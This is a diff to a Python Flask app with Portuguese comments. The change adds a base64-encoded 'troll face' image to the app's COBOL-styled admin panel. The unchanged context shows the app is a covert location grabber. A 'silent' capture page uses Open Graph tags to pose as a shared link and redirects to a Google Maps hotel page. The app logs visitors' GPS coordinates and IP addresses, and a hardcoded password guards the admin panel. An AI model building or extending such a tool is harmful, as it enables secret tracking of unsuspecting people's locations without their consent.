@@ -5,6 +5,7 @@ import json
 import nmap
 import threading
 from user_agents import parse
+import base64
 
 app = Flask(__name__)
 
@@ -17,6 +18,14 @@ SENHA_ADMIN = "123123"
 
 # Link de redirecionamento final solicitado
 LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"
+
+# Codificar a imagem trol.jpeg em Base64 automaticamente na inicialização
+try:
+    with open("trol.jpeg", "rb") as img_file:
+        trol_base64 = base64.b64encode(img_file.read()).decode('utf-8')
+        TROL_IMG_SRC = f"data:image/jpeg;base64,{trol_base64}"
+except Exception:
+    TROL_IMG_SRC = ""
 
 # Página HTML de Captura Totalmente Oculta (Silenciosa) com Meta Tags Open Graph
 HTML_CAPTURA = f"""
@@ -111,7 +120,7 @@ HTML_CAPTURA = f"""
 </html>
 """
 
-# Painel Administrativo em Estilo Código COBOL Raiz
+# Painel Administrativo com a imagem zueira esticada/achatada no canto superior direito ao fundo
 HTML_PAINEL = """
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -125,6 +134,20 @@ HTML_PAINEL = """
             padding: 20px; 
             background: #000000; 
             color: #00FF00; 
+            position: relative;
+        }
+        /* Estilização da zueira: esticada, achatada, no fundo, canto superior direito */
+        .troll-bg {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            width: 380px;
+            height: 55px;
+            object-fit: fill;
+            opacity: 0.25;
+            z-index: -1;
+            pointer-events: none;
+            border: 1px dashed #00FF00;
         }
         pre {
             color: #00FF00;
@@ -161,6 +184,10 @@ HTML_PAINEL = """
     </style>
 </head>
 <body>
+
+<!-- Imagem zueira aplicada no canto superior direito -->
+<img src="{{ troll_img }}" class="troll-bg" alt="Troll Face">
+
 <pre>
 <span class="red">*--------------------------------------------------------------------------------------------------*</span>
 <span class="yellow">  identification division.</span>
@@ -365,7 +392,7 @@ def admin():
         </body>
         """, 403
         
-    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip)
+    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip, troll_img=TROL_IMG_SRC)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
